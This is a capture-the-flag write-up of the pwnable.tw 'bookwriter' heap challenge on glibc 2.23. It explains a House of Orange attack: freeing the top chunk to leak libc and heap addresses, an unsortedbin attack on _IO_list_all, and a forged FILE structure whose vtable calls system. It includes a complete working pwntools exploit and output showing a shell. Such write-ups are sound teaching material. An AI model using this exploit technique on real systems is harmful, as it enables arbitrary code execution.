---
title: "[pwnable - pwn] Bookwriter"
published: 2022-04-19
tags: ["ctf", "pwnable"]
category: "pwn"
draft: false
description: Write-up about a heap exploitation challenge
---

## What we can do

- In the edit feature, we can overwrite the bytes right after any chunk up to the `NULL` byte.
- In the alloc handler, it iterates once too may times through the alloc array, which means it can overlap on the first entry of the size array with a huge size which would be a chunk address, then we can easily trigger large heap overflow.

The libc version is `2.23` which means there not a lot of security checks about `_IO_FILE_plus` integrity compared to more recent versions.

## Top chunk free'in

To target `_IO_FILE_plus` structures in the libc we need to leak the libc address. To do so we can overwrite the size field of the top chunk with a small value and then requesting a huge chunk which will trigger the release of the top chunk, and put it in the unsorted bin.

The mandatory thing is that `new_size + &top_chunk` has to be aligned on `PAGE_SZ` (`0x1000`).

Which gives:
```py
io = start()

def set_author(name):
    io.sendlineafter(b"Author :", name)

def alloc(size, content):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Size of page :", str(size).encode())
    io.sendlineafter(b"Content :", content)

def show(index):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Index of page :", str(index).encode())

    io.recvuntil(b"Content :\n")
    return io.recvuntil(b"\n-")[:-2]

def edit(idx, content):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Index of page :", str(idx).encode())
    io.sendlineafter(b"Content:", content)

def info():
    io.sendlineafter(b"Your choice :", b"4")
    io.sendlineafter(b"Your choice :", b"4")
    ret = io.recvline()
    io.sendlineafter(b"(yes:1 / no:0) ", b"0")
    return ret

set_author(b"A"*0x40)

alloc(0x18, b"A"*0x18)
edit(0, b"A"*0x18)
edit(0, b"A"*0x18 + pwn.p16(0xfe0 | 0x1))
# overwrite top chunk size field

alloc(0xffff, b"")
# free top chunk

"""
pwndbg> vis

0x1201000	0x0000000000000000	0x0000000000000021	........!.......
0x1201010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x1201020	0x4141414141414141	0x0000000000000fc1	AAAAAAAA........	 <-- unsortedbin[all][0]
0x1201030	0x00007fc7370efb78	0x00007fc7370efb78	x..7....x..7....
"""
```

To leak the address, we can alloc a chunk of size zero and print it. Given the fact that the `author` string is right before the alloc array and that we can overwrite the `NULL` byte we can in the same way leak the heap address.

```py
for i in range(5):
    alloc(0x0, b"")

heap = info()
heap = pwn.u64(heap[len("Author : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"):][:-1].ljust(8, b"\x00")) & ~0xfff

alloc(0, b"")
libc = pwn.u64(show(2).ljust(8, b"\x00")) - 0x3c4188

print(f"libc: {hex(libc)}")
print(f"heap: {hex(heap)}")

"""
0x150c000	0x0000000000000000	0x0000000000000021	........!.......
0x150c010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x150c020	0x4141414141414141	0x0000000000000021	AAAAAAAA!.......
0x150c030	0x00007fd150996188	0x00007fd150996188	.a.P.....a.P....
0x150c040	0x000000000150c020	0x0000000000000021	 .P.....!.......
0x150c050	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
0x150c060	0x0000000000000000	0x0000000000000021	........!.......
0x150c070	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
0x150c080	0x0000000000000000	0x0000000000000021	........!.......
0x150c090	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
0x150c0a0	0x0000000000000000	0x0000000000000021	........!.......
0x150c0b0	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
0x150c0c0	0x0000000000000000	0x0000000000000021	........!.......
0x150c0d0	0x00007fd150996188	0x00007fd150996188	.a.P.....a.P....
0x150c0e0	0x000000000150c0c0	0x0000000000000f01	..P.............	 <-- unsortedbin[all][0]
0x150c0f0	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
""""
```

Which gives:
```Shell
$ python3 exploit.py LOCAL
[*] '/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnable.tw/bookwriter'
    FORTIFY:  Enabled
[+] Starting local process '/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter': pid 19375
heap: 0x979000
libc: 0x7f301566d000
```
# File stream exploitation

File stream exploitation is a very interesting way to drop a shell according to the primitives it allows you to leverage. The house of Orange uses the `vtable` field within a `_IO_FILE_plus` structure to hiijack the control flow.

According to the libc source code, here is the definition of `struct _IO_FILE_plus`, `_IO_FILE` and `_IO_jump_t`:
```c
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};


/* The 'overflow' hook flushes the buffer.
   The second argument is a character, or EOF.
   It matches the streambuf::overflow virtual function. */
typedef int (*_IO_overflow_t) (_IO_FILE *, int);
```

The `__overflow` function pointer is called especially in the `_IO_flush_all_lockp` function, to really understand how you can reach this function I will put right below all the backtrace from the `malloc_printerr` function.

```c
static void
malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
{
  /* Avoid using this arena in future.  We do not attempt to synchronize this
     with anything else because we minimally want to ensure that __libc_message
     gets its resources safely without stumbling on the current corruption.  */
  if (ar_ptr)
    set_arena_corrupt (ar_ptr);

  if ((action & 5) == 5)
    __libc_message (action & 2, "%s\n", str);
  else if (action & 1)
    {
      char buf[2 * sizeof (uintptr_t) + 1];

      buf[sizeof (buf) - 1] = '\0';
      char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
      while (cp > buf)
        *--cp = '0';

      __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                      __libc_argv[0] ? : "<unknown>", str, cp);
    }
  else if (action & 2)
    abort ();
}

// => __libc_message is always taken as far as I know when an inconsistency is detected since there is an error to print, but action & 2 is true, which means that anyway, the abort is called as we can see right after in __libc_message.

/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap;
  int fd = -1;

  va_start (ap, fmt);

#ifdef FATAL_PREPARE
  FATAL_PREPARE;
#endif

  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
  if (on_2 == NULL || *on_2 == '\0')
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);

  if (fd == -1)
    fd = STDERR_FILENO;

  struct str_list *list = NULL;
  int nlist = 0;

  const char *cp = fmt;
  while (*cp != '\0')
    {
      /* Find the next "%s" or the end of the string.  */
      const char *next = cp;
      while (next[0] != '%' || next[1] != 's')
	{
	  next = __strchrnul (next + 1, '%');

	  if (next[0] == '\0')
	    break;
	}

      /* Determine what to print.  */
      const char *str;
      size_t len;
      if (cp[0] == '%' && cp[1] == 's')
	{
	  str = va_arg (ap, const char *);
	  len = strlen (str);
	  cp += 2;
	}
      else
	{
	  str = cp;
	  len = next - cp;
	  cp = next;
	}

      struct str_list *newp = alloca (sizeof (struct str_list));
      newp->str = str;
      newp->len = len;
      newp->next = list;
      list = newp;
      ++nlist;
    }

  bool written = false;
  if (nlist > 0)
    {
      struct iovec *iov = alloca (nlist * sizeof (struct iovec));
      ssize_t total = 0;

      for (int cnt = nlist - 1; cnt >= 0; --cnt)
	{
	  iov[cnt].iov_base = (char *) list->str;
	  iov[cnt].iov_len = list->len;
	  total += list->len;
	  list = list->next;
	}

      written = WRITEV_FOR_FATAL (fd, iov, nlist, total);

      if (do_abort)
	{
	  total = ((total + 1 + GLRO(dl_pagesize) - 1)
		   & ~(GLRO(dl_pagesize) - 1));
	  struct abort_msg_s *buf = __mmap (NULL, total,
					    PROT_READ | PROT_WRITE,
					    MAP_ANON | MAP_PRIVATE, -1, 0);
	  if (__glibc_likely (buf != MAP_FAILED))
	    {
	      buf->size = total;
	      char *wp = buf->msg;
	      for (int cnt = 0; cnt < nlist; ++cnt)
		wp = mempcpy (wp, iov[cnt].iov_base, iov[cnt].iov_len);
	      *wp = '\0';

	      /* We have to free the old buffer since the application might
		 catch the SIGABRT signal.  */
	      struct abort_msg_s *old = atomic_exchange_acq (&__abort_msg,
							     buf);
	      if (old != NULL)
		__munmap (old, old->size);
	    }
	}
    }

  va_end (ap);

  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}

// then abort is called

/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
  struct sigaction act;
  sigset_t sigs;

  /* First acquire the lock.  */
  __libc_lock_lock_recursive (lock);

  /* Now it's for sure we are alone.  But recursive calls are possible.  */

  /* Unlock SIGABRT.  */
  if (stage == 0)
    {
      ++stage;
      if (__sigemptyset (&sigs) == 0 &&
	  __sigaddset (&sigs, SIGABRT) == 0)
	__sigprocmask (SIG_UNBLOCK, &sigs, (sigset_t *) NULL);
    }

  /* Flush all streams.  We cannot close them now because the user
     might have registered a handler for SIGABRT.  */
  if (stage == 1)
    {
      ++stage;
      fflush (NULL);
    }

  /* Send signal which possibly calls a user handler.  */
  if (stage == 2)
    {
      /* This stage is special: we must allow repeated calls of
	 `abort' when a user defined handler for SIGABRT is installed.
	 This is risky since the `raise' implementation might also
	 fail but I don't see another possibility.  */
      int save_stage = stage;

      stage = 0;
      __libc_lock_unlock_recursive (lock);

      raise (SIGABRT);

      __libc_lock_lock_recursive (lock);
      stage = save_stage + 1;
    }

  /* There was a handler installed.  Now remove it.  */
  if (stage == 3)
    {
      ++stage;
      memset (&act, '\0', sizeof (struct sigaction));
      act.sa_handler = SIG_DFL;
      __sigfillset (&act.sa_mask);
      act.sa_flags = 0;
      __sigaction (SIGABRT, &act, NULL);
    }

  /* Now close the streams which also flushes the output the user
     defined handler might has produced.  */
  if (stage == 4)
    {
      ++stage;
      __fcloseall ();
    }

  /* Try again.  */
  if (stage == 5)
    {
      ++stage;
      raise (SIGABRT);
    }

  /* Now try to abort using the system specific command.  */
  if (stage == 6)
    {
      ++stage;
      ABORT_INSTRUCTION;
    }

  /* If we can't signal ourselves and the abort instruction failed, exit.  */
  if (stage == 7)
    {
      ++stage;
      _exit (127);
    }

  /* If even this fails try to use the provided instruction to crash
     or otherwise make sure we never return.  */
  while (1)
    /* Try for ever and ever.  */
    ABORT_INSTRUCTION;
}

/*
  Flush all streams.  We cannot close them now because the user
     might have registered a handler for SIGABRT.  

  the fflush is equivalent to a call to _IO_flush_all_lockp 
*/

int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

The interesting part is in the `_IO_flush_all_lockp` function, it takes the `_IO_list_all` global variable to iterate through all the file streams.
What we wanna reach would be the `_IO_OVERFLOW (fp, EOF) == EOF` check, if the control the `__overflow` field of `fp` we could hiijack the control flow.

To do so we have to craft a fake `_IO_FILE_plus` structure on the heap and make the `_chain` field of an existing file structure point toward our fake structure.

## unsortedbin attack

To control the `_chain` of a file structure we can overwrite the value of `_IO_list_all` by the address of the unsortedbin with an unsortedbin attack. Then according to the structure of the `main_arena` the unsortedbin is close to other bins like smallbins. Give the fact that the `_chain` field is at `fp+0x68`, we have to take a look at what there is at `unsortedbin+0x68`. I will not dig into the handling of bins in the `main_arena` so for this time let's just assume that out of no where `unsortedbin+0x68` points to `small_bin[4]->bk`.

So all we have to do is to craft a fake file structure of size 0x60, free it and next time unsortedbin will be requested, if the requested size is not equal to the chunk of our fake file structure, the fake file structure will be put into the right smallbin.

## Put everything together

We can easily craft the vtable to initialize only the `__overflow` function pointer to the address of `system`:
```python
fake_vtable = pwn.p64(0) * 3
fake_vtable += pwn.p64(libc + 0x45390) # &system
```

To craft the `_IO_FILE_plus` file structure, we need to take care to satisfy this condition seen above in `_IO_flush_all_lockp`:
```c
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
#endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
```

`fp->_mode` can be null, `fp->_IO_write_ptr` has to be greater than `fp->_IO_write_base`. Then `_IO_OVERFLOW (fp, EOF)` is reached.

Here comes the right file structure:
```python
fake_file = b"/bin/sh\00"                	# _flags
fake_file += pwn.p64(0x61)               	# _IO_read_ptr
fake_file += pwn.p64(libc + 0x1337)    		# _IO_read_end
fake_file += pwn.p64(libc + 0x3c4520 - 0x10)    # _IO_read_base = _IO_list_all - 0x10
fake_file += pwn.p64(1)                  	# _IO_write_base
fake_file += pwn.p64(2)                  	# _IO_write_ptr
fake_file += pwn.p64(0)*18               	# _IO_write_end ... __pad5
fake_file += pwn.p32(0)                  	# _mode
fake_file += pwn.p8(0)*20                	# _unused2
fake_file += pwn.p64(heap + 0xd0) 		# vtable 
```

## PROFIT

Here we are :)

```Shell
$ python3 exploit.py LOCAL
[*] '/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnable.tw/bookwriter'
    FORTIFY:  Enabled
[+] Starting local process '/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter': pid 30480
heap: 0x2243000
libc: 0x7fcca564c000
[*] Switching to interactive mode
*** Error in `/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter': malloc(): memory corruption: 0x00007fcca5a10520 ***
$ id
uid=1000(nasm) gid=1000(nasm) groups=1000(nasm),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),140(libvirt)
```

## Annexes

Final script:

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('bookwriter')
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
b* main
continue
'''.format(**locals())

io = None

io = start()

def set_author(name):
    io.sendlineafter(b"Author :", name)

def alloc(size, content, shell=False):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Size of page :", str(size).encode())
    
    if shell == True:
        io.interactive()

    io.sendlineafter(b"Content :", content)

def show(index):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Index of page :", str(index).encode())

    io.recvuntil(b"Content :\n")
    return io.recvuntil(b"\n-")[:-2]

def edit(idx, content):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Index of page :", str(idx).encode())
    io.sendlineafter(b"Content:", content)

def info():
    io.sendlineafter(b"Your choice :", b"4")
    io.sendlineafter(b"Your choice :", b"4")
    ret = io.recvline()
    io.sendlineafter(b"(yes:1 / no:0) ", b"0")
    return ret

set_author(b"A"*0x40)

alloc(0x18, b"A"*0x18)
edit(0, b"A"*0x18)
edit(0, b"A"*0x18 + pwn.p16(0xfe0 | 0x1))
# overwrite top chunk size field


alloc(0xffff, b"")
# free top chunk


# leak libc

for i in range(5):
    alloc(0x0, b"")

heap = info()
heap = pwn.u64(heap[len("Author : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"):][:-1].ljust(8, b"\x00")) & ~0xfff
print(f"heap: {hex(heap)}")

alloc(0, b"")
libc = pwn.u64(show(2).ljust(8, b"\x00")) - 0x3c4188 
print(f"libc: {hex(libc)}")

edit(0, b"")
alloc(0, b"")
# set top zero the first entry a size_array


fake_vtable = pwn.p64(0) * 3
fake_vtable += pwn.p64(libc + 0x45390) # &system

fake_file = b"/bin/sh\00"                # _flags

fake_file += pwn.p64(0x61)               # _IO_read_ptr
fake_file += pwn.p64(libc + 0x1337)    # _IO_read_end
#fake_file += pwn.p64(libc + 0x3c3b78)    # _IO_read_end
fake_file += pwn.p64(libc + 0x3c4520 - 0x10) # _IO_read_base = _IO_list_all - 0x10
fake_file += pwn.p64(1)                  # _IO_write_base
fake_file += pwn.p64(2)                  # _IO_write_ptr
fake_file += pwn.p64(0)*18               # _IO_write_end ... __pad5
fake_file += pwn.p32(0)                  # _mode
fake_file += pwn.p8(0)*20                # _unused2
fake_file += pwn.p64(heap + 0xd0) # 

edit(0, (pwn.p64(0)*3 + pwn.p64(0x21)) * 6 + fake_vtable + pwn.p64(0)*2 + fake_file)
edit(0, b"")

io.recvuntil(b"choice")
io.recvuntil(b"choice")

alloc(0xffff, b"", shell=True)
```

- [Very good article about house of Orange](https://1ce0ear.github.io/2017/11/26/study-house-of-orange/)
- [Article about FILE structure](https://1ce0ear.github.io/2017/09/25/File-Stream-Pointer-Overflow1/)
- [libc source code on bootlin](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4988) 

